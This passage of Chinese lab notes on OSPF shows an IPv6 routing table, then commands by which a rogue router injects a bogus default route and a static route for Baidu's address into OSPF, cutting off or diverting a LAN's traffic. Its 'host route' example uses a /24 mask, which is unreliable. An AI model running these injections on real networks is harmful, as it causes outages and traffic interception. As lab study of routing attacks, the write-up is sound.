O>* 2001:cc0:2020:4043::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4044::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4047::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4049::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:4050::/64 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:5001::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:5002::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
O>* 2001:cc0:2020:5005::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09
```

----------

### 3. 入侵测试

####   IPv4注入默认路由

在Vigilante上，添加错误默认路由，并同时注入到ospf中，则所有的ospf路由器都会学习到该错误默认路由。则整个网络内所有终端都会把没有路由的数据抓发到Vigilante的eth1，这样所有终端也无法访问Internet了。

```markdown
ip route 0.0.0.0 0.0.0.0 eth1
router ospf
default-information originate always
```

####   IPv4注入主机路由

添加错误主机路由器，例如百度，则整个局域网内的主机无法正常访问百度了，因为百度的流量被路由到Vigilante。

```markdown
ip route 14.215.177.38 255.255.255.0 eth1
router ospf
redistribute  static 
```


####   IPv6注入错误路由

类似IPv4

---

### 4. 排错

- 注意iptables和ip6tables的问题，放行协议号89。
- 注意avast防火墙问题







